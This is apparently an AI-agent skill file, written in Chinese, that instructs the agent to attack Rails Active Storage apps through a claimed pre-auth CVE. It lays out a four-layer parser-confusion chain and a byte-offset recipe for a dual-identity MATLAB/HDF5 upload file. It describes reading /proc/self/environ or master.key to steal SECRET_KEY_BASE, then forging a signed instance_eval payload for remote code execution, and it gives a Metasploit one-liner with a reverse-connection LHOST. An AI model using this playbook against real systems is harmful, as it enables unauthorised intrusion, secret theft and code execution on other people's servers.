---
name: rails-activestorage-vips-rce
description: "Use when 打 Rails Active Storage：四层解析混淆读文件→RCE。"
---

# Rails Active Storage / libvips 四层解析混淆 → 任意文件读 → RCE（CVE-2026-66066，KindaRails2Shell）

**CVSS 9.5，预认证，默认配置即中**。影响 **500K+ Rails 应用**（Rails 7+ 默认 `variant_processor = :vips`）。

| 分支 | 有漏洞 | 修复 |
|---|---|---|
| 7.2.x | 7.2.0 – 7.2.3.1 | **7.2.3.2** |
| 8.0.x | 8.0.0 – 8.0.5 | **8.0.5.1** |
| 8.1.x | 8.1.0 – 8.1.3 | **8.1.3.1** |

Rails 6.x 只在手动开了 `variant_processor = :vips` 时中。补丁 2026-07-29。

源：`0xsha/KindaRails2Shell`；Metasploit 模块 `exploit/multi/http/rails_activestorage_vips_rce`。

## 王牌：四层解析器混淆（这才是可迁移的东西）

两层独立的 content-type 分歧，串起四个组件：

```
第1层 Rails     → 信任客户端声明的 content_type（image/png）；直接上传的 blob 不重验字节
第2层 libvips   → 信任偏移 0–9 的 magic "MATLAB 5.0"，路由给 matload，不验完整头
第3层 libmatio  → 信任偏移 124–125 的版本字 0x0200，分派给 HDF5 reader，忽略描述文本不匹配
第4层 HDF5      → 信任 external(path, offset, length) 数据集引用
                  H5Dread 透明打开并读取外部文件
                  结果：任意文件字节变成 PNG 像素返回给上传者
```

**每一层都只验自己那一段，且默认为上一层可信。** 这就是“解析器链混淆”的完整样本。

## 双身份文件布局（PoC 可直接照刻）

| 偏移 | 用途 | 值 |
|---|---|---|
| 0–9 | libvips sniffer | `MATLAB 5.0` |
| 10–123 | padding | 空格 |
| 124–125 | libmatio dispatcher | `0x0200`（HDF5 v7.3） |
| 126–127 | 字节序标记 | `0x4d49`（IM） |
| 128–511 | HDF5 userblock | padding |
| 512+ | HDF5 superblock | 含 external dataset 的容器 |

判据一句话：**没有任何合法写入器会同时在字节 0 写 `MATLAB 5.0`、字节 124 写 `0x0200`**。

## 两步链

1. **读文件**：上传双身份文件 → 当图片 variant 处理 → 目标文件字节以像素形式回显。先读 **`/proc/self/environ`** 拿 `SECRET_KEY_BASE`（或读 credentials 文件）。
2. **造 RCE**：用 `SECRET_KEY_BASE` 推导 Active Storage verifier key → **伪造签名 variation JSON**，内含 `instance_eval` → 执行。

第二步是通用的：**Rails 的签名密钥一旦泄露，Active Storage 的签名 URL 全变成写入原语**（`instance_eval` 只是个入口）。

## 操作

```bash
# Metasploit
msfconsole -q -x 'use exploit/multi/http/rails_activestorage_vips_rce; set RHOSTS <t>; set LHOST <me>; run'
# 手工
ruby KindaRails2Shell.rb -u https://<host> -p /login   # 需上传面（头像/图片/附件）
```

前置：应用有**直接上传**面（ActiveStorage direct upload），且 variant 处理器是 vips。

## 坑

- 必须先有上传面。纯 API 无上传入口的应用打不了。
- `:mini_magick` 处理器不受影响（走 ImageMagick 不走 libvips/libmatio）。
- 读 `/proc/self/environ` 只在同容器/同进程有效；容器化部署里可能读到空 —— 改读 `config/credentials.yml.enc`（需 master key）或 `config/master.key`。
- 7.2.3.2 / 8.0.5.1 / 8.1.3.1 是硬分界，四版本号少一位就是没修。
